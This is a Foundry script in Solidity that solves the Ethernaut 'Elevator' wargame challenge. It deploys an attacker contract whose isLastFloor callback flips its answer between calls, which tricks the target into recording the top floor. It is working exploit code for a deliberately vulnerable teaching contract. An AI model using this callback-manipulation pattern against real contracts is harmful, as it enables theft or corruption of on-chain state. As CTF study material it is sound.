// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/11-Elevator/Elevator.sol";

contract ElevatorAttacker is Building {
    bool public s_flip = false;
    Elevator public s_elevator;

    constructor(address _elevator) {
        s_elevator = Elevator(_elevator);
    }

    function isLastFloor(uint256) external override returns (bool) {
        bool result = s_flip;
        s_flip = !s_flip;
        return result;
    }

    function attack() external {
        s_elevator.goTo(0);
    }
}

/**
 * @title Challenge 11 Solution Script
 * @notice Solution script for Elevator challenge
 */
contract ElevatorSolution is Script {
    // Replace with your instance address from Ethernaut
    address constant INSTANCE = 0xEE4BFC9b772316458895ca96736D1E531ed097ca;

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployerPrivateKey);

        ElevatorAttacker attacker = new ElevatorAttacker(INSTANCE);
        attacker.attack();
        console.log("Elevator attack executed - reached top floor");

        vm.stopBroadcast();

        console.log("Challenge completed!");
    }
}
